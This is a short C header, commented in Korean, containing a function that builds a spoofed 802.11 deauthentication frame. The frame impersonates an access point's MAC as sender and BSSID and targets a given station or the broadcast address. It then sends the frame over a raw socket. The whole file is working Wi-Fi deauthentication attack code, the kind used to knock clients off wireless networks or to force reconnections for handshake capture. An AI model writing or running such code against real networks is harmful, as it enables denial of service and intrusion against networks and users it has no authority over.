#pragma once

#include <stdint.h>
#include <string.h>
#include <sys/socket.h>

/**
 * 802.11 무선 헤더(관리 프레임) 구조(간소화):
 *  - Frame Control: 2바이트
 *  - Duration: 2바이트
 *  - DA(수신 MAC): 6바이트
 *  - SA(송신 MAC): 6바이트
 *  - BSSID: 6바이트
 *  - Sequence Control: 2바이트
 *  - Reason Code: 2바이트
 */


static inline void sendDeauthFrame(int sock, const uint8_t* apMac, const uint8_t* stMac) {
    // 간단히 802.11 Header + Reason Code만 구성 (총 24 + 2 = 26바이트)
    uint8_t frame[26];
    memset(frame, 0, sizeof(frame));

    /**
     * Frame Control (FC) = 0xC0(Deauth), 0x00(Flags)
     * Subtype(1100), Type(Management=00), Version=0
     * -> 0xC0 = 1100 0000
     */
    frame[0] = 0xc0; // Frame Control Field
    frame[1] = 0x00;

    // Duration
    frame[2] = 0x00;
    frame[3] = 0x00;

    // DA (누구에게 Deauth할지) 
    // - station MAC이 없으면 BroadCast (FF:FF:FF:FF:FF:FF)
    if (stMac) {
        memcpy(frame + 4, stMac, 6);
    } else {
        memset(frame + 4, 0xFF, 6);
    }

    // SA (송신 MAC): AP MAC
    memcpy(frame + 10, apMac, 6);

    // BSSID: AP MAC
    memcpy(frame + 16, apMac, 6);

    // Sequence Control
    frame[22] = 0x00;
    frame[23] = 0x00;

    // Reason Code
    // 0x07 = Class 3 frame received from nonassociated STA (일반적으로 많이 쓰는 코드)
    frame[24] = 0x07;
    frame[25] = 0x00;

    // 전송
    ssize_t res = send(sock, frame, sizeof(frame), 0);
    if (res == -1) {
        perror("[-] deauth failed");
    }
}
